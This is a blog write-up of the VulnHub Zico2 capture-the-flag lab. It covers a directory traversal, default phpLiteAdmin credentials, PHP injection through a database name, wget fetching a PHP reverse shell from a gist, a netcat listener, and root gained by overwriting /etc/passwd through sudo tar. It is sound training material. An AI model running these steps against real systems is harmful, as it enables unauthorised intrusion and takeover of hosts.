---
layout: post
title:  "VulnHub Zico2 Writeup"
date:   2017-10-15 00:00:00
description: Sunday Night Fever
tags: Security
---

This is a writeup for VulnHub's [zico2: 1](https://www.vulnhub.com/entry/zico2-1,210/) challenge. This weekend I'm doing two challenges, the other being [LazySysAdmin: 1](https://www.vulnhub.com/entry/lazysysadmin-1,205/).

### Host Discovery

I started with scanning the hosts in the usual IP range assignment of my network's DHCP.

```
$ nmap 192.168.0.100-120

Nmap scan report for 192.168.0.110
Host is up (0.00058s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
```

The target host is found with IP address 192.168.0.110.

### Service Discovery

Now that we got the host, let's see what open ports are accessible from remote hosts.

```
$ nmap 192.168.0.110 -A

Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-15 20:14 WIB
Nmap scan report for 192.168.0.110
Host is up (0.00063s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          41236/udp  status
|_  100024  1          57228/tcp  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds
```

SSH, an Apache HTTP server, and RPCbind. Okay, we'll start with the HTTP server.

### Zico's Website

The web server is serving a simple web page.

![Zico's Homepage](/images/posts/zico2-homepage.png)

There's no `robots.txt` file here, and if we view the source code we can see that it has `/vendor/`, `/css/`, and `/js/` directories all open to directory listing.

There's nothing interesting in all of them, but it's a good sign of improperly secured website.

I tried firing up Nikto, and it found `/img/` directory with the same directory listing problem.

```
$ nikto -h http://192.168.0.110/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.0.110
+ Target Hostname:    192.168.0.110
+ Target Port:        80
+ Start Time:         2017-10-15 20:20:00 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, inode: 3803593, size: 7970, mtime: 0x55177b7ccfb97
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2017-10-15 20:20:13 (GMT7) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The website has a big "Check Them Out!" button there if we scroll down a bit.

![Check Them Out!](/images/posts/zico2-check-them-out.png)

If clicked, it will bring us to a page with an image gallery.

![Interesting Gallery You Have There](/images/posts/zico2-view.png)

This gallery is pretty damn interesting. Did you see that URL?

```
http://192.168.0.110/view.php?page=tools.html
```

It is vulnerable to directory traversal.

![Beautiful Piece of Vulnerability](/images/posts/zico2-directory-traversal.png)

### Traversing the Host

Since I didn't see anything else worth probing up to this point, I decided to look around using the directory traversal vulnerability for a bit.

We can see the contents of `/etc/os-release` file.

```
NAME="Ubuntu"
VERSION="12.04.5 LTS, Precise Pangolin"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
VERSION_ID="12.04"
```

Ubuntu 12.04, a bit out of date. The Apache config is available on `/etc/apache2/apache2.conf`, but there's nothing we can do with that.

We're back to scanning to find more vulnerable points.

### Moar Scanning

I ran another Nmap scan, this one covering all possible port range. Here's the result.

```
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
111/tcp   open  rpcbind syn-ack ttl 64
57228/tcp open  unknown syn-ack ttl 64
MAC Address: 08:00:27:98:69:CA (Oracle VirtualBox virtual NIC)
```

There's a service running on port 57228.

```
$ nmap 192.168.0.110 -Pn -A -p57228

Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-15 20:48 WIB
Nmap scan report for 192.168.0.110
Host is up (0.00030s latency).
PORT      STATE SERVICE VERSION
57228/tcp open  status  1 (RPC #100024)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
```

But well, it doesn't seem to be the right direction for this challenge. I tried using Nmap's HTTP enumeration script next.


```
$ nmap -script http-enum.nse 192.168.0.110

Starting Nmap 7.01 ( https://nmap.org ) at 2017-10-15 21:15 WIB
Nmap scan report for 192.168.0.110
Host is up (0.0020s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
| http-enum: 
|   /view/index.shtml: Axis 212 PTZ Network Camera
|   /dbadmin/: phpMyAdmin
|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|   /vendor/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /view/: Potentially interesting folder
111/tcp open  rpcbind

Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
```

Wow, a phpMyAdmin directory and Axis 212 PTZ Network Camera.

After I checked it out, the `/dbadmin/` directory is actually running phpLiteAdmin v1.9.3 instead of phpMyAdmin and is accessible here.

```
http://192.168.0.110/dbadmin/test_db.php
```

The `/view/` directory serves blank page.

### phpLiteAdmin

The phpLiteAdmin login page is not vulnerable to SQL injection, so I did a bit of Internet search to find the default password and try it out. The default password is `admin`, and it's not changed on this machine.

It's using SQLite version 3.7.9 with database file available at `/usr/databases/test_users`. From the phpLiteAdmin, I dumped the database as CSV and got this.

```
"name";"pass";"id"
"root";"653F4B285089453FE00E2AAFAC573414";"1"
"zico";"96781A607F4E9F5F423AC01F0DAB0EBD";"2"
```

The passwords are hashed using MD5. Here's the plaintext version of it.

```
"name";"pass";"id"
"root";"34kroot34";"1"
"zico";"zico2215@";"2"
```

I tried to use both for SSH, but they don't work.

Anyway, after some Internet searching about phpLiteAdmin v1.9.3 I found this [interesting exploit](https://www.exploit-db.com/exploits/24044/) on Exploit Database.

Basically, if we create a database with a name ending with `.php` and enter a text field with a PHP code as a default value it will be treated as a PHP file.

![Working on Our Proof of Concept](/images/posts/zico2-creating-test-db.png)

Remember the directory traversal on the gallery page earlier? The time for that vulnerability to shine has come!

![Testing Our Proof of Concept](/images/posts/zico2-viewing-test-db.png)

### Getting the Shell

I created a DB that contains PHP script to run shell commands based on the vulnerability from Exploit Database we tested earlier.

![Now We're Getting Serious](/images/posts/zico2-rce-db-create.png)

And now we can execute shell commands on the web from the gallery page using parameters like this.

```
http://192.168.0.110/view.php?page=../../../../../../usr/databases/cmd.php&cmd=ls%20-alh
```

![The Result](/images/posts/zico2-rce-db-view.png)

I uploaded a PHP reverse shell script as a secret anonymous Gist on GitHub at this URL to connect to my machine's IP address.

```
https://gist.githubusercontent.com/anonymous/5cf1bb6324abcc8041c4f9e28d5f8424/raw/94a5905fca7a8a21ef4cda2cdc13e6511c7a2856/php-reverse-shell.php
```

I tried to download the PHP reverse shell script to Zico's machine using `wget` from the SQLite database I created earlier.

```
http://192.168.0.110/view.php?page=../../../../../../usr/databases/cmd.php&cmd=wget%20https://gist.githubusercontent.com/anonymous/5cf1bb6324abcc8041c4f9e28d5f8424/raw/94a5905fca7a8a21ef4cda2cdc13e6511c7a2856/php-reverse-shell.php
```

But it failed, because the whole `/var/www/` directory is owned by root and www-data doesn't have the write access there. www-data can write to `/tmp/` directory, so we'll put the PHP reverse shell there.


```
http://192.168.0.110/view.php?page=../../../../../../usr/databases/cmd.php&cmd=wget%20https://gist.githubusercontent.com/anonymous/5cf1bb6324abcc8041c4f9e28d5f8424/raw/94a5905fca7a8a21ef4cda2cdc13e6511c7a2856/php-reverse-shell.php%20-O%20/tmp/php-reverse-shell.php
```

I started `netcat` to listen for connection from PHP reverse shell.

```
$ nc -lnvp 1234
```

Then, I accessed PHP reverse shell from browser to get the...well, reverse shell.

```
http://192.168.0.110/view.php?page=../../../../../../tmp/php-reverse-shell.php
```

I already got the reverse shell on `netcat`. Now, I execute this for a proper TTY shell.

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

### Escalating Our Privilege

Both the passwords for root and zico we got on phpLiteAdmin doesn't work for us to `su` to their accounts. So we'll need to find another way to get the flag.

I started by listing SUID files to exploit.

```
$ find / -perm -4000 -type f 2>/dev/null
```

But there doesn't seem to be anything useful.

I went to `/home/zico` directory and found a file called `to_do.txt`.

```
$ ls -alh
total 9.1M
drwxr-xr-x  6 zico zico 4.0K Jun 19 12:04 .
drwxr-xr-x  3 root root 4.0K Jun  8 17:58 ..
-rw-------  1 zico zico  912 Jun 19 12:09 .bash_history
-rw-r--r--  1 zico zico  220 Jun  8 17:58 .bash_logout
-rw-r--r--  1 zico zico 3.5K Jun  8 17:58 .bashrc
-rw-rw-r--  1 zico zico 493K Jun 14 18:14 bootstrap.zip
drwxrwxr-x 18 zico zico 4.0K Jun 19 12:02 joomla
-rw-r--r--  1 zico zico  675 Jun  8 17:58 .profile
drw-------  2 zico zico 4.0K Jun  8 18:18 .ssh
drwxrwxr-x  6 zico zico 4.0K Aug 19  2016 startbootstrap-business-casual-gh-pages
-rw-rw-r--  1 zico zico   61 Jun 19 12:04 to_do.txt
-rw-------  1 zico zico 3.5K Jun 19 12:04 .viminfo
drwxr-xr-x  5 zico zico 4.0K Jun 19 12:03 wordpress
-rw-rw-r--  1 zico zico 8.5M Jun 19 11:52 wordpress-4.8.zip
-rw-rw-r--  1 zico zico 1.2K Jun  8 18:34 zico-history.tar.gz
```

The `to_do.txt` contains text as follows.

```

try list:
- joomla
- bootstrap (+phpliteadmin)
- wordpress

```

It seems to be a list of CMS Zico tried for his website but ended up choosing Bootstrap and phpLiteAdmin.

In the `/wordpress/` directory, there's `wp-config.php` file that contains the MySQL credentials.

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'zico');

/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');

/** MySQL hostname */
define('DB_HOST', 'zico');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');
```

The `DB_PASSWORD` is the password for zico, who is a sudoer but isn't allowed to use `su` on root.

I checked the `zico-history.tar.gz` file, but it only contains a text file about Zico the footballer.

```
https://en.wikipedia.org/wiki/Zico

Arthur Antunes Coimbra, born 3 March 1953 in Rio de Janeiro), better know Zico, is a Brazilian coach and former footballer, who played as an attacking midfielder. Often called the "White Pelé", he was a creative playmaker, with excellent technical skills, vision, and en eye for goal, who is considered one of the most clinical finishers and best passers ever, as well as one of the greatest players of all time.[2][3][4] Arguably the world's best player of the late 1970s and early 80s, he is regarded as one of the best playmakers and free kick specialists in history, able to bend the ball in all directions.[5] In 1999, Zico came eighth in the FIFA Player of the Century grand jury vote, and in 2004 was named in the FIFA 100 list of the world's greatest living players.[6][7] According to Pelé, generally considered the best player ever, "throughout the years, the one player that came closest to me was Zico".[8]

With 48 goals in 71 official appearances for Brazil, Zico is fifth highest goalscorer for his national team.[9] He represented them in the 1978, 1982 and 1986 World Cups. They did not win any of those tournaments, even though the 1982 squad is considered one of the greatest Brazilian national squads ever.[10] Zico is often considered one of the best players in football history not to have been on a World Cup winning squad. He was chosen 1981[11] and 1983 Player of the Year.

Zico has coached the Japanese national team, appearing in the 2006 FIFA World Cup and winning the Asian Cup 2004, and Fenerbahçe, who were a quarter-finalist in 200 in the Champions League under his command. He was announced as the head coach of CSKA Moscow in January 2009. On 16 September 2009, Zico was signed by Greek side Olympiacos for a two-year contract after the club's previous coach, Temuri Ketsbaia, was sacked. He was fired four months later, on 19 January 2010.[
```

The password for zico can't be used on MySQL. By the way, here's the list of open port.

```
$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:57228           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::33782                :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 127.0.0.1:858           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
udp        0      0 192.168.0.110:123       0.0.0.0:*                           -               
udp        0      0 127.0.0.1:123           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:123             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:771             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:41236           0.0.0.0:*                           -               
udp6       0      0 :::111                  :::*                                -               
udp6       0      0 ::1:123                 :::*                                -               
udp6       0      0 :::123                  :::*                                -               
udp6       0      0 :::37808                :::*                                -               
udp6       0      0 :::771                  :::*                                -
```

The zico account's sudo access is very limited, but that should be enough to do our trick.

```
$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

My trick to the privilege escalation will be based on this `/bin/tar` binary.

First, go to `/home/zico`. We're going to make a file exactly the same as the current `/etc/passwd` there.

```
$ cd /home/zico
$ cat /etc/passwd > passwd
```

Connect to the zico host using SSH, then use vim to replace the `x` on root password with an encrypted password of yours. You can pick something from your machine's `/etc/shadow` and put it there using this format.

```
root:[YOUR ENCRYPTED PASSWORD]:0:0:root:/root:/bin/bash
```

Next, we're going to use `/bin/tar` as root to archive it.

```
$ sudo tar -cvf passwd.tar passwd
```

Now we have the `passwd.tar` file owned by root. We can use `/bin/tar` to replace the `/etc/passwd` file using our version of `passwd` in `passwd.tar`.

```
$ cd /etc/
$ sudo tar -xvf /home/zico/passwd.tar
```

Voila, we can now use `su` to root with the password we just set in `/etc/passwd`.

### Capturing the Flag

Go to the `/root` directory, since we already got the root access. The flag is available in the `flag.txt` file.

```
# cat flag.txt 
#
#
#
# ROOOOT!
# You did it! Congratz!
# 
# Hope you enjoyed! 
# 
# 
#
#


```

That's it, folks! Thanks for the challenge, [Rafael](https://www.vulnhub.com/author/rafael,565/)!